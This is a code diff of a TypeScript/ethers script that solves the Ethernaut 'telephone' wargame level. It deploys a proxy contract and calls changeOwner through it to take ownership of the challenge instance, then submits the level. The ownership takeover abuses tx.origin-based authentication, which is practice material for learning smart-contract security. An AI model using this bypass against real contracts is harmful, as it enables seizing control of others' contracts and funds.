@@ -5,15 +5,14 @@ import { getSigner } from "./signer";
 import { ProxyCall } from "../typechain/ProxyCall";
 import { BigNumber, BytesLike } from "ethers";
 import { Interface } from "ethers/lib/utils";
+import { createLevel, submitLevel } from "./utils";
 
 async function main() {
-  const instanceAddress = "0xe1eBF1f14aae36ca39CC8Ec722901771fe08359e";
   const signer = getSigner();
+  const level = await createLevel(signer,"telephone");
 
-  // 0x682Fc3f0384b0f464415feC28b233764CeB88d3a
   const factory = await ethers.getContractFactory("ProxyCall", signer);
-  // const proxy = await factory.deploy() as ProxyCall
-  const proxy = factory.attach("0x682Fc3f0384b0f464415feC28b233764CeB88d3a") as ProxyCall
+  const proxy = await factory.deploy() as ProxyCall  
   await proxy.deployed();
   console.log("Proxy deployed to:", proxy.address);
 
@@ -37,9 +36,10 @@ async function main() {
   const iface = new Interface(abi);
   const formatData: BytesLike = iface.encodeFunctionData("changeOwner", [await signer.getAddress()]);
   console.log(formatData)
-  const tx = await proxy.proxy(instanceAddress, formatData, {gasLimit:62000});
+  const tx = await proxy.proxy(level, formatData, {gasLimit:112000});
   const receipt = await tx.wait();
   console.log(receipt);
+  await submitLevel(signer, level);
 
 }
 main()
